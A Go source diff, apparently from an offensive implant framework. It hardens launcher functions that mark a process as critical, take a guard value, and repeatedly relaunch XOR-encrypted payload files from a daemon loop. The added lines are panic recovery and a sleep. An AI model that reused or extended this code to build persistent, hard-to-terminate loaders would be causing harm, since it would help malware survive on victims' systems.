@@ -48,6 +48,11 @@ import (
 //               random order and is expected to be encrypted using the supplied
 //               key value.
 func Start(critical bool, l man.Linker, guard string, key []byte, files []string) {
+	defer func() {
+		if err := recover(); err != nil {
+			device.GoExit()
+		}
+	}()
 	var z bool
 	if time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(200))); critical {
 		z, _ = device.SetCritical(true)
@@ -84,6 +89,11 @@ func Loop(wait time.Duration, critical bool, l man.Linker, guard string, key []b
 		Start(critical, l, guard, key, files)
 		return
 	}
+	defer func() {
+		if err := recover(); err != nil {
+			device.GoExit()
+		}
+	}()
 	limits.Ignore()
 	var (
 		w = make(chan os.Signal, 1)
@@ -149,6 +159,7 @@ func Daemon(t time.Duration, name string, critical bool, l man.Linker, guard str
 	}
 	device.DaemonTicker(name, t, func(x context.Context) error {
 		limits.MemorySweep(x)
+		time.Sleep(time.Second * 10)
 		man.WakeMultiFile(l, guard, crypto.XOR(key), files)
 		return nil
 	})
